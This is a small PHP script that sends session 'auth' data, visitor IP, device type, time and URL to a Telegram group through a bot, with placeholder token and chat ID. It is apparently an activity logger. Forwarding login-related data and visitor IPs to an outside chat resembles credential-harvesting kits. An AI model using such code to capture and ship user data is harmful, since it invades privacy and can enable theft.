<?php
    session_start();

    // act - содержит информацию о действии
    $act = isset($_SESSION['act']) ? $_SESSION['act'] : 'Действие не указано';

    // "Распаковка" сессии по параметрам
    if (isset($_SESSION['auth'])) {
        $data = $_SESSION['auth']['data'];
        $serves = $_SESSION['auth']['serves'];
    } elseif (isset($_SESSION['NOauth'])) {
        $data = $_SESSION['NOauth']['NOdata'];
        $serves = $_SESSION['NOauth']['NOserves'];
    } else {
        $data = 'Не указан';
        $serves = 'Не указан';
    }

    $userIP = $_SERVER['REMOTE_ADDR'];
    $time = date('d-m-Y H:i:s');
    $domain = 'example.com';
    $currentURL = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$domain$_SERVER[REQUEST_URI]";

    // От спама своего ip / своего сервера
    if ($userIP === 'your ip' && ($currentURL === 'https://example.com/' || $currentURL === 'https://example.com/auth.php')) {
        exit('log - no');
    }

    // Тип устройства
    if(isset($_SERVER['HTTP_USER_AGENT'])) {
    $agent = $_SERVER['HTTP_USER_AGENT'];
    if (strpos($agent, 'Mobile')!== false) {
        $deviceType = 'Mobile';
    } else {
        $deviceType = 'PC';
        }
    } else {
    $deviceType = 'No';
    }

    // Токен и id группы для логирования
    $botToken = 'telegram';
    $chatID = '-group id';

    // Отправляемое сообщение ботом в группу
    $message = "$act\n<b>Data:</b> $data\n<b>Device:</b> $deviceType;\n<b>Time:</b> $time;\n<b>IP:</b> $userIP;\n<b>URL:</b> $currentURL\n<b>$serves</b>";

    $url = 'https://api.telegram.org/bot'. $botToken. '/sendMessage';

    $postData = http_build_query([
        'chat_id' => $chatID,
        'text' => $message,
        'parse_mode' => 'html'
    ]);

    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $postData
        ]
    ];
    $context  = stream_context_create($options);

    $result = file_get_contents($url, false, $context);

    // Удаляем параметры сессии с действием / запретом входа
    unset($_SESSION['act']);
    unset($_SESSION['NOauth']);
?>